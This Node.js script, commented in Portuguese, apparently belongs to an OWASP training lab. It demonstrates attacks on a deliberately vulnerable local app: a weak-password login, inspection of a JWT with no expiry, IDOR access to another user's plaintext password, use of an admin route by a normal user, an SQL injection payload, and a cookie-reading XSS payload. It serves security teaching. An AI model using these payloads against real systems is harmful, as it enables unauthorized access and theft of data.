#!/usr/bin/env node
/**
 *  DEMO DE ATAQUES — OWASP Lab
 *  Execute APÓS iniciar a app vulnerável: node vulnerable/app.js
 *  Requisito: npm install node-fetch  (ou Node 18+ com fetch nativo)
 */

const BASE = 'http://localhost:3000';

async function req(method, path, body, headers = {}) {
  const opts = { method, headers: { 'Content-Type': 'application/json', ...headers } };
  if (body) opts.body = JSON.stringify(body);
  const r = await fetch(BASE + path, opts);
  const text = await r.text();
  try { return { status: r.status, body: JSON.parse(text) }; }
  catch { return { status: r.status, body: text }; }
}

function header(title) {
  console.log('\n' + '═'.repeat(60));
  console.log('  ' + title);
  console.log('═'.repeat(60));
}

function ok(msg)   { console.log(msg); }
function warn(msg) { console.log(msg); }
function vuln(msg) { console.log('  VULNERABILIDADE: ' + msg); }

async function main() {
  console.log('\nDEMONSTRAÇÃO DE ATAQUES OWASP — App Vulnerável');
  console.log(' Certifique-se de que o servidor está rodando na porta 3000\n');

  // A07 — AUTHENTICATION FAILURES
  header('A07 — Authentication Failures');

  warn('Tentando login com senha trivial "123"...');
  const loginRes = await req('POST', '/login', { username: 'admin', password: '123' });
  if (loginRes.status === 200) {
    vuln(`Login bem-sucedido com senha "123"! Token: ${loginRes.body.token.substring(0, 40)}...`);
    ok('Token obtido. Observe: sem campo "exp" → nunca expira.');

    const token = loginRes.body.token;

    // Decodifica payload do JWT sem verificar assinatura (base64)
    const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
    console.log('  📋 Payload do token:', JSON.stringify(payload));
    if (!payload.exp) vuln('Campo "exp" ausente — token sem validade!');

    // A01 — BROKEN ACCESS CONTROL: IDOR
    header('A01 — Broken Access Control (IDOR)');

    warn('Usuário admin tentando acessar perfil de userId=2 (joao)...');
    const idor = await req('GET', '/meu-perfil?userId=2', null, { Authorization: `Bearer ${token}` });
    if (idor.status === 200) {
      vuln(`Acesso ao perfil de outro usuário! Dados: ${JSON.stringify(idor.body)}`);
      if (idor.body.password) vuln(`Senha em texto puro exposta: "${idor.body.password}"`);
    }

    // A01 — Rota admin sem checagem de role
    header('A01 — Broken Access Control (Escalada de Privilégios)');

    warn('Fazendo login como usuário comum (joao)...');
    const joaoLogin = await req('POST', '/login', { username: 'joao', password: 'password' });
    const joaoToken = joaoLogin.body.token;

    warn('joao (role: user) acessando /admin/users...');
    const adminRes = await req('GET', '/admin/users', null, { Authorization: `Bearer ${joaoToken}` });
    if (adminRes.status === 200) {
      vuln(`Usuário comum acessou rota de admin! ${adminRes.body.users.length} usuários expostos.`);
    }

    // A05 — SQL INJECTION
    header("A05 — Injection: SQL Injection");

    const payload_sql = "' OR '1'='1";
    warn(`Enviando filtro malicioso: ${payload_sql}`);
    const sqlRes = await req('GET', `/pedidos?filter=${encodeURIComponent(payload_sql)}`, null, { Authorization: `Bearer ${token}` });
    if (sqlRes.status === 200) {
      console.log('  📋 Query executada:', sqlRes.body.query_executada);
      vuln(`SQL Injection bem-sucedida! ${sqlRes.body.results?.length} registros vazados (todos os pedidos).`);
    }

    // A05 — XSS Refletido
    header('A05 — Injection: XSS Refletido');

    const xssPayload = '<script>alert("XSS: Cookie roubado: " + document.cookie)</script>';
    warn(`Enviando payload XSS: ${xssPayload}`);
    const xssRes = await req('GET', `/buscar?q=${encodeURIComponent(xssPayload)}`);
    if (xssRes.body.includes('<script>')) {
      vuln('Script injetado refletido no HTML! Em um browser, o alert seria executado.');
      console.log('  📋 Trecho do HTML retornado:');
      console.log('    ' + xssRes.body.match(/<h2>.*<\/h2>/)?.[0]);
    }

  } else {
    console.log('  Servidor não respondeu. Inicie: node vulnerable/app.js');
  }

  console.log('\n' + '═'.repeat(60));
  console.log('  RESUMO: Todas as vulnerabilidades foram demonstradas.');
  console.log('  Veja secure/app.js para as correções aplicadas.');
  console.log('═'.repeat(60) + '\n');
}

main().catch(err => {
  console.error('Erro ao executar demo. O servidor está rodando?', err.message);
});
